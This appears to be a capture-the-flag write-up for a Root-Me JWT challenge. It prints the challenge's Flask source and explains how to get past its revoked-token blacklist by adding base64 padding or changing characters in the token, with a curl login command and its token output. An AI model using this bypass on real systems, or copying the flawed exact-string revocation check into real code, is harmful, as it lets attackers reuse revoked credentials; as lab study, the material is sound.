Source code
```py
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-
    from flask import Flask, request, jsonify
    from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
    import datetime
    #from apscheduler.schedulers.background import BackgroundScheduler
    import threading
    import jwt
    from config import *
     
    # Setup flask
    app = Flask(__name__)
     
    app.config['JWT_SECRET_KEY'] = SECRET
    jwtmanager = JWTManager(app)
    blacklist = set()
    lock = threading.Lock()
     
    # Free memory from expired tokens, as they are no longer useful
    def delete_expired_tokens():
        with lock:
            to_remove = set()
            global blacklist
            for access_token in blacklist:
                try:
                    jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
                except:
                    to_remove.add(access_token)
           
            blacklist = blacklist.difference(to_remove)
     
    @app.route("/web-serveur/ch63/")
    def index():
        return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
     
    # Standard login endpoint
    @app.route('/web-serveur/ch63/login', methods=['POST'])
    def login():
        try:
            username = request.json.get('username', None)
            password = request.json.get('password', None)
        except:
            return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
     
        if username != 'admin' or password != 'admin':
            return jsonify({"msg": "Bad username or password"}), 401
     
        access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
        ret = {
            'access_token': access_token,
        }
       
        with lock:
            blacklist.add(access_token)
     
        return jsonify(ret), 200
     
    # Standard admin endpoint
    @app.route('/web-serveur/ch63/admin', methods=['GET'])
    @jwt_required
    def protected():
        access_token = request.headers.get("Authorization").split()[1]
        with lock:
            if access_token in blacklist:
                return jsonify({"msg":"Token is revoked"})
            else:
                return jsonify({'Congratzzzz!!!_flag:': FLAG})
     
     
    if __name__ == '__main__':
        scheduler = BackgroundScheduler()
        job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
        scheduler.start()
        app.run(debug=False, host='0.0.0.0', port=5000)
```

Adding padding the string/hash will change but the token will still be the same and not really revoked.

So just add a `=` of replace `_` with `/`

Get the token:
```
┌─[nguyenlong05@sw1mj3llyf1sh] - [~] - [Fri Jan 31, 15:59]
└─[$] <> curl -X POST http://challenge01.root-me.org/web-serveur/ch63/login --data '{"username":"admin","password":"admin"}' -H "Content-Type: application/json"
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzgzMTM5OTksIm5iZiI6MTczODMxMzk5OSwianRpIjoiNmExYzc4NTQtM2Q2OS00OGQ0LTgyNzUtNjc1ODcxNDQ1MWNjIiwiZXhwIjoxNzM4MzE0MTc5LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.7CPvUM-sOW5h22MAaHdpku6Q4XAzxkKHeeor2l4AhEs"}
```

![alt text](image/image-7.png)